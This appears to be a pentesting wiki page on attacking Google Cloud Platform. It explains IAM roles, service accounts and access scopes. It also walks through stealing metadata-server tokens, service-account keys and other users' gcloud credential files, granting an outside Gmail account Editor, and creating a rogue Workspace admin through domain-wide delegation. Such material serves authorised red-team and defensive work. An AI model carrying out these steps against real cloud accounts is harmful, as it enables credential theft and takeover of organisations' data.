# GCP Security

## Security concepts <a href="security-concepts" id="security-concepts"></a>

### **Resource hierarchy**

Google Cloud uses a [Resource hierarchy](https://cloud.google.com/resource-manager/docs/cloud-platform-resource-hierarchy) that is similar, conceptually, to that of a traditional filesystem. This provides a logical parent/child workflow with specific attachment points for policies and permissions.

At a high level, it looks like this:

```
Organization
--> Folders
  --> Projects
    --> Resources
```

A virtual machine (called a Compute Instance) is a resource. A resource resides in a project, probably alongside other Compute Instances, storage buckets, etc.

### **IAM Roles**

There are** three types** of roles in IAM:

* **Basic/Primitive roles**, which include the **Owner**, **Editor**, and **Viewer** roles that existed prior to the introduction of IAM.
* **Predefined roles**, which provide granular access for a specific service and are managed by Google Cloud. There are a lot of predefined roles, you can **see all of them with the privileges they have **[**here**](https://cloud.google.com/iam/docs/understanding-roles#predefined\_roles).
* **Custom roles**, which provide granular access according to a user-specified list of permissions.

There are thousands of permissions in GCP. In order to check if a role has a permissions you can [**search the permission here**](https://cloud.google.com/iam/docs/permissions-reference) and see which roles have it.

**You can also **[**search here predefined roles**](https://cloud.google.com/iam/docs/understanding-roles#product\_specific\_documentation)** offered by each product.**

#### Basic roles

| Name             | Title  | Permissions                                                                                                                                                                                                                                        |
| ---------------- | ------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **roles/viewer** | Viewer | Permissions for **read-only actions** that do not affect state, such as viewing (but not modifying) existing resources or data.                                                                                                                    |
| **roles/editor** | Editor | All **viewer permissions**, **plus** permissions for actions that modify state, such as changing existing resources.                                                                                                                               |
| **roles/owner**  | Owner  | <p>All <strong>Editor</strong> permissions <strong>and</strong> permissions for the following actions:</p><ul><li>Manage roles and permissions for a project and all resources within the project.</li><li>Set up billing for a project.</li></ul> |

You can try the following command to specifically **enumerate roles assigned to your service account** project-wide in the current project:

```bash
PROJECT=$(curl http://metadata.google.internal/computeMetadata/v1/project/project-id \
    -H "Metadata-Flavor: Google" -s)
ACCOUNT=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email \
    -H "Metadata-Flavor: Google" -s)
gcloud projects get-iam-policy $PROJECT  \
    --flatten="bindings[].members" \
    --format='table(bindings.role)' \
    --filter="bindings.members:$ACCOUNT"
```

Don't worry too much if you get denied access to the command above. It's still possible to work out what you can do simply by trying to do it.

More generally, you can shorten the command to the following to get an idea of the **roles assigned project-wide to all members**.

```
gcloud projects get-iam-policy [PROJECT-ID]
```

Or to see the IAM policy [assigned to a single Compute Instance](https://cloud.google.com/sdk/gcloud/reference/compute/instances/get-iam-policy) you can try the following.

```
gcloud compute instances get-iam-policy [INSTANCE] --zone [ZONE]
```

### **Service accounts**

Virtual machine instances are usually **assigned a service account**. Every GCP project has a [default service account](https://cloud.google.com/compute/docs/access/service-accounts#default\_service\_account), and this will be assigned to new Compute Instances unless otherwise specified. Administrators can choose to use either a custom account or no account at all. This service account** can be used by any user or application on the machine** to communicate with the Google APIs. You can run the following command to see what accounts are available to you:

```
gcloud auth list
```

**Default service accounts will look like** one of the following:

```
PROJECT_NUMBER-compute@developer.gserviceaccount.com
PROJECT_ID@appspot.gserviceaccount.com
```

A** custom service account **will look like this:

```
SERVICE_ACCOUNT_NAME@PROJECT_NAME.iam.gserviceaccount.com
```

If `gcloud auth list` returns **multiple** accounts **available**, something interesting is going on. You should generally see only the service account. If there is more than one, you can cycle through each using `gcloud config set account [ACCOUNT]` while trying the various tasks in this blog.

### **Access scopes**

The **service account** on a GCP Compute Instance will **use** **OAuth** to communicate with the Google Cloud APIs. When [access scopes](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam) are used, the OAuth token that is generated for the instance will **have a **[**scope**](https://oauth.net/2/scope/)** limitation included**. This defines **what API endpoints it can authenticate to**. It does **NOT define the actual permissions**.

When using a **custom service account**, Google [recommends](https://cloud.google.com/compute/docs/access/service-accounts#service\_account\_permissions) that access scopes are not used and to **rely totally on IAM**. The web management portal actually enforces this, but access scopes can still be applied to instances using custom service accounts programatically.

There are three options when setting an access scope on a VM instance:

* Allow default access
* All full access to all cloud APIs
* Set access for each API

You can see what **scopes** are **assigned** by **querying** the **metadata** URL. Here is an example from a VM with "default" access assigned:

```
$ curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \
    -H 'Metadata-Flavor:Google'

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
https://www.googleapis.com/auth/servicecontrol
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/trace.append
```

The most interesting thing in the **default** **scope** is **`devstorage.read_only`**. This grants read access to all storage buckets in the project. This can be devastating, which of course is great for us as an attacker.

Here is what you'll see from an instance with **no scope limitations**:

```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'
https://www.googleapis.com/auth/cloud-platform
```

This `cloud-platform` scope is what we are really hoping for, as it will allow us to authenticate to any API function and leverage the full power of our assigned IAM permissions.

It is possible to encounter some **conflicts** when using both **IAM and access scopes**. For example, your service account may have the IAM role of `compute.instanceAdmin` but the instance you've breached has been crippled with the scope limitation of `https://www.googleapis.com/auth/compute.readonly`. This would prevent you from making any changes using the OAuth token that's automatically assigned to your instance.

### Default credentials <a href="default-credentials" id="default-credentials"></a>

**Default service account token**

The **metadata server** available to a given instance will **provide** any user/process **on that instance** with an **OAuth token** that is automatically used as the **default credentials** when communicating with Google APIs via the `gcloud` command.

You can retrieve and inspect the token with the following curl command:

```
$ curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google"
```

Which will receive a response like the following:

```
{
      "access_token":"ya29.AHES6ZRN3-HlhAPya30GnW_bHSb_QtAS08i85nHq39HE3C2LTrCARA",
      "expires_in":3599,
      "token_type":"Bearer"
 }
```

This token is the **combination of the service account and access scopes** assigned to the Compute Instance. So, even though your service account may have **every IAM privilege **imaginable, this particular OAuth token **might be limited** in the APIs it can communicate with due to **access scopes**.

**Application default credentials**

When using one of Google's official GCP client libraries, the code will automatically go **searching for credentials** following a strategy called [Application Default Credentials](https://cloud.google.com/docs/authentication/production).

1. First, it will check would be the [**source code itself**](https://cloud.google.com/docs/authentication/production#passing\_the\_path\_to\_the\_service\_account\_key\_in\_code). Developers can choose to statically point to a service account key file.
2. The next is an **environment variable called `GOOGLE_APPLICATION_CREDENTIALS`**. This can be set to point to a **service account key file**.
3. Finally, if neither of these are provided, the application will revert to using the **default token provided by the metadata server** as described in the section above.

Finding the actual **JSON file with the service account credentials** is generally much **more** **desirable** than **relying on the OAuth token** on the metadata server. This is because the raw service account credentials can be activated **without the burden of access scopes** and without the short expiration period usually applied to the tokens.

### **Networking**

Compute Instances are connected to networks called VPCs or [Virtual Private Clouds](https://cloud.google.com/vpc/docs/vpc). [GCP firewall](https://cloud.google.com/vpc/docs/firewalls) rules are defined at this network level but are applied individually to a Compute Instance. Every network, by default, has two [implied firewall rules](https://cloud.google.com/vpc/docs/firewalls#default\_firewall\_rules): allow outbound and deny inbound.

Each GCP project is provided with a VPC called `default`, which applies the following rules to all instances:

* default-allow-internal (allow all traffic from other instances on the `default` network)
* default-allow-ssh (allow 22 from everywhere)
* default-allow-rdp (allow 3389 from everywhere)
* default-allow-icmp (allow ping from everywhere)

**Meet the neighbors**

Firewall rules may be more permissive for internal IP addresses. This is especially true for the default VPC, which permits all traffic between Compute Instances.

You can get a nice readable view of all the subnets in the current project with the following command:

```
gcloud compute networks subnets list
```

And an overview of all the internal/external IP addresses of the Compute Instances using the following:

```
gcloud compute instances list
```

If you go crazy with nmap from a Compute Instance, Google will notice and will likely send an alert email to the project owner. This is more likely to happen if you are scanning public IP addresses outside of your current project. Tread carefully.

**Enumerating public ports**

Perhaps you've been unable to leverage your current access to move through the project internally, but you DO have read access to the compute API. It's worth enumerating all the instances with firewall ports open to the world - you might find an insecure application to breach and hope you land in a more powerful position.

In the section above, you've gathered a list of all the public IP addresses. You could run nmap against them all, but this may taken ages and could get your source IP blocked.

When attacking from the internet, the default rules don't provide any quick wins on properly configured machines. It's worth checking for password authentication on SSH and weak passwords on RDP, of course, but that's a given.

What we are really interested in is other firewall rules that have been intentionally applied to an instance. If we're lucky, we'll stumble over an insecure application, an admin interface with a default password, or anything else we can exploit.

[Firewall rules](https://cloud.google.com/vpc/docs/firewalls) can be applied to instances via the following methods:

* [Network tags](https://cloud.google.com/vpc/docs/add-remove-network-tags)
* [Service accounts](https://cloud.google.com/vpc/docs/firewalls#serviceaccounts)
* All instances within a VPC

Unfortunately, there isn't a simple `gcloud` command to spit out all Compute Instances with open ports on the internet. You have to connect the dots between firewall rules, network tags, services accounts, and instances.

We've automated this completely using [this python script](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_firewall\_enum) which will export the following:

* CSV file showing instance, public IP, allowed TCP, allowed UDP
* nmap scan to target all instances on ports ingress allowed from the public internet (0.0.0.0/0)
* masscan to target the full TCP range of those instances that allow ALL TCP ports from the public internet (0.0.0.0/0)

## Enumeration

{% hint style="info" %}
Remember that in all those **resources belonging to a project** you can use the parameter `--project <project-name>` to enumerate the resources that belongs to that specific project.
{% endhint %}

### IAM

| Description                                                                                                                        | Command                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| List **roles**                                                                                                                     | `gcloud iam roles list --filter='etag:AA=='`                           |
| Get **description** and permissions of a role                                                                                      | gcloud iam roles describe roles/container.admin                        |
| Get iam **policy** of a **organisation**                                                                                           | `gcloud organizations get-iam-policy`                                  |
| Get iam **policy** of a **project**                                                                                                | `gcloud projects get-iam-policy <project-id>`                          |
| Get iam **policy** of a **folder**                                                                                                 | `gcloud resource-manager folders get-iam-policy`                       |
| [**Testable permissions**](https://cloud.google.com/iam/docs/reference/rest/v1/permissions/queryTestablePermissions) on a resource | `gcloud iam list-testable-permissions --filter "NOT apiDisabled: true` |
| List of **grantable** **roles** for a resource                                                                                     | `gcloud iam list-grantable-roles <project URL>`                        |
| List **custom** **roles** on a project                                                                                             | `gcloud iam roles list --project $PROJECT_ID`                          |
| List **service accounts**                                                                                                          | `gcloud iam service-accounts list`                                     |

### Compute Engine / Virtual Machines

| Description                      | Command                                                                                                   |
| -------------------------------- | --------------------------------------------------------------------------------------------------------- |
| List all **instances**           | `gcloud compute instances list`                                                                           |
| List **instances** **templates** | `gcloud compute instance-templates list`                                                                  |
| Show instance **info**           | `gcloud compute instances describe "<instance-name>" --project "<project-name>" --zone "us-west2-a"`      |
| Get **active** **zones**         | `gcloud compute regions list \| grep -E "NAME\|[^0]/`                                                     |
| **Stop** an instance             | `gcloud compute instances stop instance-2`                                                                |
| **Start** an instance            | `gcloud compute instances start instance-2`                                                               |
| **Create** an instance           | `gcloud compute instances create vm1 --image image-1 --tags test --zone "<zone>" --machine-type f1-micro` |
| **SSH** to instance              | `gcloud compute ssh --project "<project-name>" --zone "<zone-name>" "<instance-name>"`                    |
| **Download** files               | `gcloud compute copy-files example-instance:~/REMOTE-DIR ~/LOCAL-DIR --zone us-central1-a`                |
| **Upload** files                 | `gcloud compute copy-files ~/LOCAL-FILE-1 example-instance:~/REMOTE-DIR --zone us-central1-a`             |
| List all **disks**               | `gcloud compute disks list`                                                                               |
| List all disk types              | `gcloud compute disk-types list`                                                                          |
| List all **snapshots**           | `gcloud compute snapshots list`                                                                           |
| **Create** snapshot              | `gcloud compute disks snapshot --snapshotname --zone $zone`                                               |
| List **images**                  | `gcloud compute images list`                                                                              |
| List **subnets**                 | `gcloud compute networks subnets list`                                                                    |

## Unauthenticated Attacks

{% content-ref url="gcp-buckets-brute-force-and-privilege-escalation.md" %}
[gcp-buckets-brute-force-and-privilege-escalation.md](gcp-buckets-brute-force-and-privilege-escalation.md)
{% endcontent-ref %}

## Local Privilege Escalation / SSH Pivoting

Supposing that you have compromised a VM in GCP, there are some **GCP privileges** that can allow you to **escalate privileges locally, into other machines and also pivot to other VMs**:

{% content-ref url="gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Cloud privilege escalation <a href="cloud-privilege-escalation" id="cloud-privilege-escalation"></a>

### GCP Interesting Permissions <a href="organization-level-iam-permissions" id="organization-level-iam-permissions"></a>

The most common way once you have obtained some cloud credentials of has compromised some service running inside a cloud is to **abuse miss-configured privileges **the compromised account may have. So, the first thing you should do is to enumerate your privileges.

Moreover, during this enumeration, remember that **permissions can be set at the highest level of "Organization"** as well.

{% content-ref url="gcp-interesting-permissions.md" %}
[gcp-interesting-permissions.md](gcp-interesting-permissions.md)
{% endcontent-ref %}

### Bypassing access scopes <a href="bypassing-access-scopes" id="bypassing-access-scopes"></a>

When [access scopes](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam) are used, the OAuth token that is generated for the computing instance (VM) will **have a **[**scope**](https://oauth.net/2/scope/)** limitation included**. However, you might be able to **bypass** this limitation and exploit the permissions the compromised account has.

The **best way to bypass** this restriction is either to **find new credentials** in the compromised host, to **find the service key to generate an OUATH token** without restriction or to **jump to a different VM less restricted**.

**Pop another box**

It's possible that another box in the environment exists with less restrictive access scopes. If you can view the output of `gcloud compute instances list --quiet --format=json`, look for instances with either the specific scope you want or the **`auth/cloud-platform`** all-inclusive scope.

Also keep an eye out for instances that have the default service account assigned (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`).

**Find service account keys**

Google states very clearly [**"Access scopes are not a security mechanism… they have no effect when making requests not authenticated through OAuth"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam).

Therefore, if you **find a **[**service account key**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys)** **stored on the instance you can bypass the limitation. These are **RSA private keys** that can be used to authenticate to the Google Cloud API and **request a new OAuth token with no scope limitations**.

Check if any service account has exported a key at some point with:

```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
    echo Looking for keys for $i:
    gcloud iam service-accounts keys list --iam-account $i
done
```

These files are **not stored on a Compute Instance by default**, so you'd have to be lucky to encounter them. The default name for the file is `[project-id]-[portion-of-key-id].json`. So, if your project name is `test-project` then you can **search the filesystem for `test-project*.json`** looking for this key file.

The contents of the file look something like this:

```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```

Or, if **generated from the CLI **they will look like this:

```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```

If you do find one of these files, you can tell the **`gcloud` command to re-authenticate** with this service account. You can do this on the instance, or on any machine that has the tools installed.

```bash
gcloud auth activate-service-account --key-file [FILE]
```

You can now **test your new OAuth token** as follows:

```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```

You should see `https://www.googleapis.com/auth/cloud-platform` listed in the scopes, which means you are **not limited by any instance-level access scopes**. You now have full power to use all of your assigned IAM permissions.

### **Steal gcloud authorizations**

It's quite possible that** other users on the same box have been running `gcloud`** commands using an account more powerful than your own. You'll **need local root** to do this.

First, find what `gcloud` config directories exist in users' home folders.

```
$ sudo find / -name "gcloud"
```

You can manually inspect the files inside, but these are generally the ones with the secrets:

* \~/.config/gcloud/credentials.db
* \~/.config/gcloud/legacy\_credentials/\[ACCOUNT]/adc.json
* \~/.config/gcloud/legacy\_credentials/\[ACCOUNT]/.boto
* \~/.credentials.json

Now, you have the option of looking for clear text credentials in these files or simply copying the entire `gcloud` folder to a machine you control and running `gcloud auth list` to see what accounts are now available to you.

### Service account impersonation <a href="service-account-impersonation" id="service-account-impersonation"></a>

Impersonating a service account can be very useful to **obtain new and better privileges**.

There are three ways in which you can [impersonate another service account](https://cloud.google.com/iam/docs/understanding-service-accounts#impersonating\_a\_service\_account):

* Authentication **using RSA private keys** (covered [above](./#bypassing-access-scopes))
* Authorization **using Cloud IAM policies** (covered [here](gcp-iam-escalation.md#iam.serviceaccounttokencreator))
* **Deploying jobs on GCP services** (more applicable to the compromise of a user account)

### Granting access to management console <a href="granting-access-to-management-console" id="granting-access-to-management-console"></a>

Access to the [GCP management console](https://console.cloud.google.com) is **provided to user accounts, not service accounts**. To log in to the web interface, you can **grant access to a Google account** that you control. This can be a generic "**@gmail.com**" account, it does **not have to be a member of the target organization**.

To **grant** the primitive role of **Owner** to a generic "@gmail.com" account, though, you'll need to **use the web console**. `gcloud` will error out if you try to grant it a permission above Editor.

You can use the following command to **grant a user the primitive role of Editor** to your existing project:

```bash
gcloud projects add-iam-policy-binding [PROJECT] --member user:[EMAIL] --role roles/editor
```

If you succeeded here, try **accessing the web interface** and exploring from there.

This is the **highest level you can assign using the gcloud tool**.

### Spreading to Workspace via domain-wide delegation of authority <a href="spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) is Google's c**ollaboration and productivity platform** which consists of things like Gmail, Google Calendar, Google Drive, Google Docs, etc.&#x20;

**Service accounts** in GCP can be granted the **rights to programatically access user data** in Workspace by impersonating legitimate users. This is known as [domain-wide delegation](https://developers.google.com/admin-sdk/reports/v1/guides/delegation). This includes actions like **reading** **email** in GMail, accessing Google Docs, and even creating new user accounts in the G Suite organization.

Workspace has [its own API](https://developers.google.com/gsuite/aspects/apis), completely separate from GCP. Permissions are granted to Workspace and **there isn't any default relation between GCP and Workspace**.

However, it's possible to **give** a service account **permissions** over a Workspace user. If you have access to the Web UI at this point, you can browse to **IAM -> Service Accounts** and see if any of the accounts have **"Enabled" listed under the "domain-wide delegation" column**. The column itself may **not appear if no accounts are enabled **(you can read the details of each service account to confirm this). As of this writing, there is no way to do this programatically, although there is a [request for this feature](https://issuetracker.google.com/issues/116182848) in Google's bug tracker.

To create this relation it's needed to **enable it in GCP and also in Workforce**.

#### Test Workspace access

To test this access you'll need the** service account credentials exported in JSON** format. You may have acquired these in an earlier step, or you may have the access required now to create a key for a service account you know to have domain-wide delegation enabled.

This topic is a bit tricky… your service account has something called a "client\_email" which you can see in the JSON credential file you export. It probably looks something like `account-name@project-name.iam.gserviceaccount.com`. If you try to access Workforce API calls directly with that email, even with delegation enabled, you will fail. This is because the Workforce directory will not include the GCP service account's email addresses. Instead, to interact with Workforce, we need to actually impersonate valid Workforce users.

What you really want to do is to **impersonate a user with administrative access**, and then use that access to do something like **reset a password, disable multi-factor authentication, or just create yourself a shiny new admin account**.

Gitlab've created [this Python script](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) that can do two things - list the user directory and create a new administrative account. Here is how you would use it:

```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --account pwned
```

You can try this script across a range of email addresses to impersonate **various** **users**. Standard output will indicate whether or not the service account has access to Workforce, and will include a **random password for the new admin accoun**t if one is created.

If you have success creating a new admin account, you can log on to the [Google admin console](https://admin.google.com) and have full control over everything in G Suite for every user - email, docs, calendar, etc. Go wild.

### Looting

If you have compromised some account there are several GCP services you might be able to access and extract sensitive information from them:

{% content-ref url="gcp-looting.md" %}
[gcp-looting.md](gcp-looting.md)
{% endcontent-ref %}

## References

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
